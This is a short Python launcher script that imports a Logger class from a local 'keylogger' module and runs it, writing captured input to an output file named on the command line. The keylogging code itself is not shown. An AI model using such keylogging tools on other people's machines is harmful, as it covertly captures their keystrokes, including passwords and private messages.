import sys
from keylogger import Logger

def main(argc, argv):

    if argc < 2:
        raise UserWarning("Run with command line argument for output file.")
        exit()
    output_file = argv[1]

    log = Logger(output_file)
    log.run()

if __name__ == "__main__":
    main(len(sys.argv), sys.argv)
